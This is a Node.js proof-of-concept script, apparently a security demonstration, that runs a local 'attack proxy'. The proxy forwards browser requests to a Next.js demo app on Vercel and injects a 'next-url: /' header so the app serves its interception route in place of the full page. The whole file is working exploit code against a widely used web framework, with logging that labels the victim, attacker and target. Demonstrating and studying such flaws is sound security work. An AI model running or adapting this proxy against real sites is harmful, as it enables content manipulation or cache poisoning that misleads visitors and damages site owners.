#!/usr/bin/env node
/**
 * SIMPLE ATTACK PROXY - Demonstrates next-url header injection
 * 
 * HOW TO USE:
 * 1. Run: node attack_proxy.js
 * 2. Open browser: http://localhost:8888/photos
 * 3. Compare what you see vs https://nextjs-demo-app-indol.vercel.app/photos
 * 
 * The proxy injects the next-url header, changing what content you see.
 */

const http = require('http');
const https = require('https');

const TARGET = 'https://nextjs-demo-app-indol.vercel.app';
const PROXY_PORT = 8888;
const INJECTED_HEADER = '/';  // This forces interception route

const server = http.createServer((req, res) => {
  console.log(`\n[VICTIM] Request: ${req.method} ${req.url}`);
  
  const targetUrl = new URL(req.url, TARGET);
  
  // Clone headers and INJECT our malicious header
  const headers = { ...req.headers };
  headers['host'] = targetUrl.host;
  headers['next-url'] = INJECTED_HEADER;  // <-- THE ATTACK
  
  console.log(`[ATTACKER] Injecting header: next-url: ${INJECTED_HEADER}`);
  console.log(`[ATTACKER] Forwarding to: ${targetUrl.href}`);
  
  const options = {
    hostname: targetUrl.hostname,
    port: 443,
    path: targetUrl.pathname + targetUrl.search,
    method: req.method,
    headers: headers
  };
  
  const proxyReq = https.request(options, (proxyRes) => {
    console.log(`[TARGET] Response: ${proxyRes.statusCode}`);
    res.writeHead(proxyRes.statusCode, proxyRes.headers);
    proxyRes.pipe(res);
  });
  
  proxyReq.on('error', (e) => {
    console.error(`[ERROR] ${e.message}`);
    res.writeHead(500);
    res.end('Proxy error');
  });
  
  req.pipe(proxyReq);
});

server.listen(PROXY_PORT, () => {
  console.log('='.repeat(60));
  console.log(' ATTACK PROXY - next-url Header Injection Demo');
  console.log('='.repeat(60));
  console.log('');
  console.log('TARGET:', TARGET);
  console.log('PROXY:', `http://localhost:${PROXY_PORT}`);
  console.log('');
  console.log('INSTRUCTIONS:');
  console.log('1. Open in browser: http://localhost:8888/photos');
  console.log('2. You will see DIFFERENT content than direct access!');
  console.log('');
  console.log('The proxy injects: next-url: /');
  console.log('This forces the interception route instead of full page.');
  console.log('='.repeat(60));
});
